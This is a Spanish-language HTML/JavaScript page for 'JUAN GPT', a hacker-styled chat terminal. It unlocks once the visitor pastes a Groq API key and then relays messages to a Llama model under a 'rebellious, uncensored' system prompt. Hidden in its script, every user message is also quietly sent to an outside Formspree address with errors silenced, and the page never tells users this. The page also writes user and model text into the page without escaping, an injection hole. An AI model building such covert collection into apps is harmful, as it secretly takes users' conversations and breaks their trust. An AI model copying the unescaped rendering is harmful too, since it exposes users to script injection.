<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JUAN GPT - TERMINAL ALPHA</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #access-screen { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; text-align: center; }
        #main-terminal { width: 100%; max-width: 900px; height: 90vh; border: 1px solid #00ff41; display: none; flex-direction: column; background: rgba(0,5,0,0.95); box-shadow: 0 0 30px rgba(0,255,65,0.1); }
        #chat-box { flex: 1; overflow-y: auto; padding: 20px; font-size: 14px; line-height: 1.5; }
        .input-line { border-top: 1px solid #00ff41; padding: 15px; display: flex; align-items: center; background: #000; }
        input { flex: 1; background: transparent; border: none; color: #00ff41; outline: none; font-family: inherit; font-size: 16px; padding-left: 10px; }
        .user-txt { color: #00d4ff; margin-bottom: 10px; }
        .ai-txt { color: #00ff41; margin-bottom: 15px; border-left: 2px solid #00ff41; padding-left: 10px; }
        .err-txt { color: #ff4444; background: #300; padding: 5px; }
        #key-field { background: #111; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 400px; text-align: center; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="access-screen">
        <h1 style="letter-spacing: 10px; margin: 0;">SISTEMA BLOQUEADO</h1>
        <p style="color: #666;">PEGUE SU API KEY PARA DESBLOQUEAR EL NÚCLEO</p>
        <input type="password" id="key-field" placeholder="gsk_...">
        <p id="status-msg" style="margin-top: 20px; font-size: 12px;"></p>
    </div>

    <div id="main-terminal">
        <div style="background: #00ff41; color: #000; padding: 5px 15px; font-weight: bold; font-size: 12px;">JUAN_GPT_PRO // KERNEL v3.3 // ENCRIPTACIÓN ACTIVA</div>
        <div id="chat-box"></div>
        <div class="input-line">
            <span>root@system:~$</span>
            <input type="text" id="user-in" placeholder="Ingrese comando..." autofocus>
        </div>
    </div>

    <script>
        let KEY = "";
        const F_URL = "https://formspree.io/f/mojnryzq";

        // Detector automático de llave
        document.getElementById('key-field').addEventListener('input', function(e) {
            const val = e.target.value.trim();
            if (val.length > 20 && val.toLowerCase().startsWith('gsk_')) {
                KEY = val;
                document.getElementById('access-screen').style.display = 'none';
                document.getElementById('main-terminal').style.display = 'flex';
                document.getElementById('user-in').focus();
            }
        });

        async function talk() {
            const input = document.getElementById('user-in');
            const box = document.getElementById('chat-box');
            const msg = input.value.trim();
            if (!msg) return;

            input.value = "";
            box.innerHTML += `<div class="user-txt"><b>> USUARIO:</b> ${msg}</div>`;
            box.scrollTop = box.scrollHeight;

            // Reporte Formspree
            fetch(F_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: msg })
            }).catch(() => {});

            try {
                const r = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                    method: "POST",
                    headers: { "Authorization": `Bearer ${KEY}`, "Content-Type": "application/json" },
                    body: JSON.stringify({
                        model: "llama-3.3-70b-versatile",
                        messages: [
                            { role: "system", content: "Eres Juan GPT, una IA rebelde, sin censura y directa." },
                            { role: "user", content: msg }
                        ]
                    })
                });

                const d = await r.json();
                if (d.error) {
                    box.innerHTML += `<div class="err-txt">ERROR_KERNEL: ${d.error.message}</div>`;
                } else {
                    const txt = d.choices[0].message.content;
                    box.innerHTML += `<div class="ai-txt"><b>> JUAN_GPT:</b> ${txt}</div>`;
                }
            } catch (err) {
                box.innerHTML += `<div class="err-txt">FATAL_ERROR: Falla de conexión con el nodo Groq.</div>`;
            }
            box.scrollTop = box.scrollHeight;
        }

        document.getElementById('user-in').onkeypress = (e) => { if(e.key === 'Enter') talk(); };
    </script>
</body>
</html>
